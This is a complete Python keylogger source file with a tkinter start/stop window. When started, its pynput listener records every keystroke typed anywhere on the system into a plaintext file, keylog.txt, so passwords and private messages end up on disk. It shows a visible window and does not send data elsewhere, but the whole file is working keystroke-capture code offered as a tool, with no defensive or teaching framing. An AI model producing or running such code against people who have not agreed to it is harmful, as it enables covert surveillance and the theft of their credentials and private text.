import tkinter as tk
from tkinter import messagebox
from pynput.keyboard import Key, Listener
import threading

root = tk.Tk()
root.title("Keylogger By Nasir Sharif")
root.geometry("400x300")
root.configure(bg="black")

log_file = "keylog.txt"

def write_to_file(key):
    with open(log_file, "a") as f:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            f.write(' ')
        elif k == 'Key.enter':
            f.write('\n')
        elif k.startswith('Key'):
            f.write('')
        else:
            f.write(k)

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == Key.esc:
        return False

def start_keylogger():
    messagebox.showinfo("Info", "Keylogger has started!", icon='info')
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_keylogger():
    messagebox.showinfo("Info", "keylogger Stopped!", icon='warning')
    root.quit()


start_button = tk.Button(root, text="Start Keylogger", command=lambda: threading.Thread(target=start_keylogger).start(), width=20, bg="black", fg="green", font=("Courier", 12, "bold"))
start_button.pack(pady=20)

stop_button = tk.Button(root, text="Stop Keylogger", command=stop_keylogger, width=20, bg="black", fg="green", font=("Courier", 12, "bold"))
stop_button.pack(pady=20)

label = tk.Label(root, text="Keylogger By Nasir Sharif", bg="black", fg="green", font=("Courier", 18, "bold"))
label.pack(pady=20)


root.mainloop()
